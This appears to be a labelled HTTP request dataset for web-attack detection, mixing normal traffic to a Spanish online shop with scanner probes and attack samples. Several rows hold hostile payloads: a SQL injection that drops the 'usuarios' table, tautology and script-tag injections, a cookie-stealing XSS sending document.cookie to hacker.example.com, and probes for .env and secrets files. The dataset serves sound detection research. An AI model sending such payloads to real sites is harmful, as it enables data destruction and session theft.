text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6261408FFB1C207669F2CE12A182BAE5 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"POST /jsonrpc [SEP]  {""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}} [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ",POST,/jsonrpc,,"{""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}}",Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),404,1,scanning,loki_exp1
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=giertych&password=in4o75u1t4%21bili0a1&nombre=Dem%F3stenes&apellidos=Acebes+Matiz&email=dark%40ajuntamentbarcelona2-0.fi&dni=34575761E&direccion=Escocia+197+&ciudad=Riner&cp=26540&provincia=%C1vila&ntc=9607018610591675&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A88F4D7795A175E395188C22DDA77D70 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=giertych&password=in4o75u1t4%21bili0a1&nombre=Dem%F3stenes&apellidos=Acebes+Matiz&email=dark%40ajuntamentbarcelona2-0.fi&dni=34575761E&direccion=Escocia+197+&ciudad=Riner&cp=26540&provincia=%C1vila&ntc=9607018610591675&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/miembros.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BD0646A930B521A545F05F9A60B82D4D localhost:8080  ,GET,/tienda1/publico/miembros.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BA6223966FA715231640AA9C8560F2BB localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /orgs [SEP]   [SEP] Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology) [SEP]     ,GET,/orgs,,,Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology),404,1,scanning,loki_exp1
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=crowder&password=*huer8o&nombre=Cesaria&apellidos=Estruch+Guixa&email=ebersole.finney%40mauroman.cr&dni=83100561C&direccion=Pla%E7a+Mossen+Geis%2C+115+4%3FC&ciudad=O%3Fd*%F3n&cp=18520&provincia=C%E1ceres&ntc=8256741675769162&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=E92E510EA470B03735F3629600F0E040 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=crowder&password=*huer8o&nombre=Cesaria&apellidos=Estruch+Guixa&email=ebersole.finney%40mauroman.cr&dni=83100561C&direccion=Pla%E7a+Mossen+Geis%2C+115+4%3FC&ciudad=O%3Fd*%F3n&cp=18520&provincia=C%E1ceres&ntc=8256741675769162&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=2 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=45A41FFBE64C3078064C325DF949E235 localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=2,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5A7501D78A623FDE973263693A12423C localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /.circleci/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/.circleci/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/imagenes/cmenbul.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0CE5B4885DF4971AC302D7A7AD905548 localhost:8080  ,GET,/tienda1/imagenes/cmenbul.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro%3F&login=colford&password=corojo&nombre=Omega&apellidos=Sanagua+Manzano&email=olsson.kupfer%40arroyo-molinos.mz&dni=33198749C&direccion=C%2F+Guatlla%2C+59%2C+3%3FE&ciudad=Noez&cp=29328&provincia=Ciudad+Real&ntc=6531738879978731&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3C0ABC86A70312B8C20CDE5C296FD7E8 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro%3F&login=colford&password=corojo&nombre=Omega&apellidos=Sanagua+Manzano&email=olsson.kupfer%40arroyo-molinos.mz&dni=33198749C&direccion=C%2F+Guatlla%2C+59%2C+3%3FE&ciudad=Noez&cp=29328&provincia=Ciudad+Real&ntc=6531738879978731&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=%257C  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B2061945DF6409BBE7A5931237A37963 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=%257C,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/carrito.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=81C9923CF6DE91F7F1610BECA8833B47 localhost:8080  ,GET,/tienda1/publico/carrito.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/miembros.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D3CA83863D30061F382FA32E757DEF87 localhost:8080  ,GET,/tienda1/publico/miembros.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsgA=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=DF0E2CC35C613538F1766AEA4F058548 localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsgA=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5EC02DB204F24531B9A0AC8869FE78D7 localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E2FC6E5DFEC1C89A8C4E32881FD0123F localhost:8080  ,GET,/tienda1/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/cmenbul.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8577547DCCA01F3F1854EFEBFFD3E113 localhost:8080  ,GET,/tienda1/imagenes/cmenbul.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=13BE76CD4575BAA1245A98D06D3218C7 localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsgA=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=43CFADB0E8F11388797A64CA8E6174A0 localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsgA=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /phpinfodev [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/phpinfodev,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=hernzlia&password=7etu%2Ca&nombre=Osorio&apellidos=Mans+Vi%F1as&email=sone%40tristanyvioletina.nf&dni=70806659D&direccion=C%2F+Lago+Ba%F1olas+40+&ciudad=Villarluengo&cp=41870&provincia=Cantabria&ntc=3259495581211566&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=DF1BE6C5838E33AEA975CD4D074246B3 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=hernzlia&password=7etu%2Ca&nombre=Osorio&apellidos=Mans+Vi%F1as&email=sone%40tristanyvioletina.nf&dni=70806659D&direccion=C%2F+Lago+Ba%F1olas+40+&ciudad=Villarluengo&cp=41870&provincia=Cantabria&ntc=3259495581211566&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/miembros.jsp/asf-logo-wide.gif/ [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=EC585409D5F1AEDE2809613A33980CD5 localhost:8080  ,GET,/tienda1/publico/miembros.jsp/asf-logo-wide.gif/,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C660110B29927CD43F105C336305C218 localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectas  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AEE7A05CC2AAFB8205305FEFC4006956 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/miembros.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=988EB12FBFF58B60927FE32C9A497CC3 localhost:8080  ,GET,/tienda1/publico/miembros.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Vino+Rioja&precio=100&cantidad=79&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AAC4E55A714A723A433373F1403A0965 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=100&cantidad=79&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /env/template/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/env/template/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectas  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=24BD32F7AD1C3C0B26CF38F03C488EBD localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=fitness&password=chap8n&nombre=Sol&apellidos=Masferr%E9+Massan%E9s&email=fechner_rabel%40fortelingenieria.sd&dni=85063049X&direccion=Can+Ferragut%2C+132%2C+4%3FE&ciudad=Rebolledo+de+la+Torre&cp=25727&provincia=Almer%EDa&ntc=6608191382152819&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=68960A875793F11DC8A93E7CE472213D localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=fitness&password=chap8n&nombre=Sol&apellidos=Masferr%E9+Massan%E9s&email=fechner_rabel%40fortelingenieria.sd&dni=85063049X&direccion=Can+Ferragut%2C+132%2C+4%3FE&ciudad=Rebolledo+de+la+Torre&cp=25727&provincia=Almer%EDa&ntc=6608191382152819&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=772BCFF65D25518A45DB0F2118923CA7 localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=2AF7B8AC03EC8345C8D0913D702328FA localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /iisstart.htm [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=93284863977CE8F23FA567729341A26D localhost:8080  ,GET,/iisstart.htm,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=%27OR%27a%3D%27a&login=carmelin&password=cI9CuE7t6%F1AL&nombre=Yago&apellidos=Morgadas&email=mondini%40goscan.io&dni=81743896X&direccion=Pantano+De+La+Sotonera%2C+145+&ciudad=Ahigal+de+los+Aceiteros&cp=26526&provincia=Tarragona&ntc=0742459903329031&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E07BFBF872EB414003B0CCC3FD29C2E2 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=%27OR%27a%3D%27a&login=carmelin&password=cI9CuE7t6%F1AL&nombre=Yago&apellidos=Morgadas&email=mondini%40goscan.io&dni=81743896X&direccion=Pantano+De+La+Sotonera%2C+145+&ciudad=Ahigal+de+los+Aceiteros&cp=26526&provincia=Tarragona&ntc=0742459903329031&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,scanning,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A4CDBDE813C241A8E615B446967F9660 localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=macduff&password=ex*eg%E9tica&nombre=Silvia&apellidos=Gutarra+Marimon&email=mandel_lanctot%40elrincondelmarmol.bu&dni=83657455S&direccion=San+Petersburgo%2C+165+&ciudad=Peligros&cp=03669&provincia=%C1vila&ntc=3816140055742895&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=9C03C0968DA7BF32C8577AAD979C8AFE localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=macduff&password=ex*eg%E9tica&nombre=Silvia&apellidos=Gutarra+Marimon&email=mandel_lanctot%40elrincondelmarmol.bu&dni=83657455S&direccion=San+Petersburgo%2C+165+&ciudad=Peligros&cp=03669&provincia=%C1vila&ntc=3816140055742895&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /samples/sampsite/catalog.htm [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D5F0B829602B7570EDF5B6D32899A2A4 localhost:8080  ,GET,/samples/sampsite/catalog.htm,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=05EF57EDCA551FA07B185CBEBEA875B7 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/estilos.css [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=95C15566B313F95D26310F154CE232B4 localhost:8080  ,GET,/tienda1/global/estilos.css,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=bagnato33&pwdA=p9n4o52s0a&remember=on&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=28DF6C7C4B28ABEEB6E9255984058C6E localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=bagnato33&pwdA=p9n4o52s0a&remember=on&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /config/secrets/users.bak [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/config/secrets/users.bak,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Vino+Rioja&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&cantidad=98&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=4FF46EB728495AE2F6EADD87885D1D1A localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&cantidad=98&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,xss,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=3&nombre=Queso+Manchego&precio=100&cantidad=4&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B34317B3C2F3F7858DCADAC779B23770 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=100&cantidad=4&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /data/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/data/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=8516&B1=Confirmar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0F763439FE0A70B9A268EA58A4C50FE1 localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=8516&B1=Confirmar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D5DF9CE3BE147E5801B76563228CE88A localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=mathurin&password=476en9o9na5&nombre=Vartan&apellidos=Altamiranda+Aragon%E9s&email=kosanovic%40discon.cg&dni=56702228Y&direccion=Orellana%2C+98%2C+&ciudad=Belalc%E1zar&cp=09258&provincia=Girona&ntc=3348558480673240&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C879F5725DA52C670CF0157AE3E16B14 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=mathurin&password=476en9o9na5&nombre=Vartan&apellidos=Altamiranda+Aragon%E9s&email=kosanovic%40discon.cg&dni=56702228Y&direccion=Orellana%2C+98%2C+&ciudad=Belalc%E1zar&cp=09258&provincia=Girona&ntc=3348558480673240&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=9499&B1=Confirmar%2F [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=51C9CE1704D0036F76B0FBDD569ADB61 localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=9499&B1=Confirmar%2F,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2A=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=61BBD88A2ACCBDEECE73A33160D189C0 localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2A=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/1.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=13342EE679C22843A9266DD80218A4B9 localhost:8080  ,GET,/tienda1/imagenes/1.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
